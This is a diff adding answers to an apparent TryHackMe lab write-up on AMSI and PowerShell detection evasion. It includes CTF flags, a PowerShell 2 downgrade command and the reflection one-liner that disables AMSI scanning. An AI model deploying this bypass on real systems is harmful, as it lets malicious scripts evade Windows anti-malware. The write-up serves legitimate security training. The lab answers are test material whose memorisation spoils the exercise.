@@ -50,6 +50,8 @@ We will primarily focus on [AMSI(Anti-Malware Scan Interface)](https://docs.micr
 
 * What runtime detection measure is shipped natively with Windows?
 
+	**Answer : AMSI**
+
 ## Task 3 - AMSI Overview
 
 **AMSI** (Anti-Malware Scan Interface) is a PowerShell security feature that will allow any applications or services to integrate directly into anti-malware products. Defender instruments AMSI to scan payloads and scripts before execution inside the .NET runtime. From Microsoft: "The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard that allows your applications and services to integrate with any anti-malware product that's present on a machine. AMSI provides enhanced malware protection for your end-users and their data, applications, and workloads."
@@ -87,6 +89,8 @@ In the next task, we will cover the technical details behind how AMSI works and 
 * Read the above and answer the question below.
 
 * What response value is assigned to `32768`?
+
+	**Answer : AMSI_RESULT_DETECTED**
 
 ## Task 4 - AMSI Instrumentation
 
@@ -130,6 +134,8 @@ We can take our knowledge of how AMSI is instrumented and research from others t
 
 * Will AMSI be instrumented if the file is only on disk? (Y/N)
 
+	**Answer : N**
+
 ## Task 5 - PowerShell Downgrade
 
 The PowerShell downgrade attack is a very low-hanging fruit that allows attackers to modify the current PowerShell version to remove security features.
@@ -157,6 +163,14 @@ The two easiest mitigations are removing the PowerShell 2.0 engine from the devi
 * Read the above and practice downgrading PowerShell on the provided machine.
 
 * Enter the flag obtained from the desktop after executing the command in cmd.exe.
+
+	```
+	PowerShell -Version 2
+	```
+
+	![task5-flag.png]
+	
+	**Answer : THM{p0w3r5h3ll_d0wn6r4d3!}**
 
 ## Task 6 - PowerShell Reflection
 
@@ -201,6 +215,14 @@ Read the above and practice leveraging the one-liner on the provided machine.
 * To utilize the one-liner, you can run it in the same session as the desired malicious code or prepend it to the malicious code.
 
 * Enter the flag obtained from the desktop after executing the command.
+
+	```
+	[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+	```
+
+	![task6-flag](./images/task6-flag.png)
+
+	**Answer : THM{r3fl3c7_4ll_7h3_7h1n65}**
 
 ## Task 7 - Patching AMSI
 
@@ -298,6 +320,10 @@ At this stage, we should have an AMSI bypass that works! It should be noted that
 * Read the above and execute/observe the script on the provided machine.
 
 * Enter the flag obtained from the desktop after executing the command.
+
+	![task7-flag](./images/task7-flag.png)
+
+	**Answer : THM{p47ch1n6_15n7_ju57_f0r_7h3_600d_6uy5}**
 
 ## Task 8 - Patching AMSI
 
